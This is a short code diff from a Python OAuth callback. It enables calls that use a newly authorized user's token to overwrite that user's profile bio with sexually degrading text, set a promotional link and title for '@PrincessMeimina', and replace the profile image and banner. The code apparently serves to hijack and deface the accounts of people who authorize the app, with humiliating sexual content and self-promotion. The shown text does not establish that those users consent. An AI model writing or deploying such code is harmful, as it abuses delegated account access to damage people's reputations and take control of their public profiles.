@@ -180,10 +180,10 @@ def callback():
     
     real_client = oauth.Client(consumer, real_token)
     description="I am a dumb slut for @PrincessMeimina. Meimina$$ owns me"
-    #update_profile(real_client,"beacons.ai/princessmeimina","Princess Meimina's leash",description)
-    #update_profile_image(real_client)
-    #update_profile_banner(real_client)
-    update_profile_name(real_client,"Princess Meimina's Puppy")
+    update_profile(real_client,"beacons.ai/princessmeimina","Princess Meimina's leash",description)
+    update_profile_image(real_client)
+    update_profile_banner(real_client)
+    #update_profile_name(real_client,"Princess Meimina's Puppy")
     '''
     real_resp, real_content = real_client.request(
         show_user_url + '?user_id=' + user_id, "GET")
